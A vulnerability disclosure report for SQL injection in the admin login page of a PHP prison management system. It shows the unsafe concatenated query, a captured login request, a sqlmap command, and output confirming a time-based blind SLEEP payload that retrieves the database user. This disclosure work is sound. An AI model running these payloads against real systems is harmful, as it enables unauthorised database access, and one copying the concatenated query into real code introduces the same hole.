Prison Management System - SQL Injection on (/Admin/login.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/Admin/login.php
```

In this scenario, user input (username and password) is directly  incorporated into an SQL query without any filtering or prepared  statements, making the application susceptible to SQL Injection attacks.

```
Userinput reaches sensitive sink. For more information, press the help icon on the left side.
11: mysqli_query $result = mysqli_query($conn, $sql); 
10: $sql = "SELECT * FROM users WHERE username='" . $username . "' and password = '" . $password . "'"; 
7: $username = $_POST['txtusername']; 
8: $password = $_POST['txtpassword']; 
requires:
4: if(isset($_POST['btnlogin']))
```

Proof of vulnerability:

Request:

```
POST /Admin/login.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://localhost:8888
Sec-GPC: 1
Connection: close
Referer: http://localhost:8888/prison/Admin/login.php
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

txtusername=admin&txtpassword=1111&btnlogin=
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
10:17:25] [INFO] parsing HTTP request from '1.txt'
[10:17:25] [WARNING] provided value for parameter 'btnlogin' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[10:17:25] [INFO] testing connection to the target URL
[10:17:25] [INFO] testing if the target URL content is stable
[10:17:25] [INFO] target URL content is stable
[10:17:25] [INFO] testing if POST parameter 'txtusername' is dynamic
[10:17:26] [WARNING] POST parameter 'txtusername' does not appear to be dynamic
[10:17:26] [WARNING] heuristic (basic) test shows that POST parameter 'txtusername' might not be injectable
[10:17:26] [INFO] testing for SQL injection on POST parameter 'txtusername'
[10:17:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:17:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:17:26] [INFO] testing 'Generic inline queries'
[10:17:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:17:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:17:26] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
[10:17:36] [INFO] POST parameter 'txtusername' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:17:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:17:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://localhost:8888/prison/Admin/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[10:17:37] [INFO] target URL appears to be UNION injectable with 5 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[10:17:38] [INFO] checking if the injection point on POST parameter 'txtusername' is a false positive
POST parameter 'txtusername' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 99 HTTP(s) requests:
---
Parameter: txtusername (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: txtusername=admin' AND (SELECT 2408 FROM (SELECT(SLEEP(5)))RNxC) AND 'eFIc'='eFIc&txtpassword=1111&btnlogin=
---
[10:17:54] [INFO] the back-end DBMS is MySQL
[10:17:54] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12
[10:17:54] [INFO] fetching current user
[10:17:54] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[10:18:09] [INFO] adjusting time delay to 1 second due to good response times
root@localhost
current user: 'root@localhost'
[10:18:59] [INFO] fetched data logged to text files under '/Users/leeyu/.local/share/sqlmap/output/localhost'
```

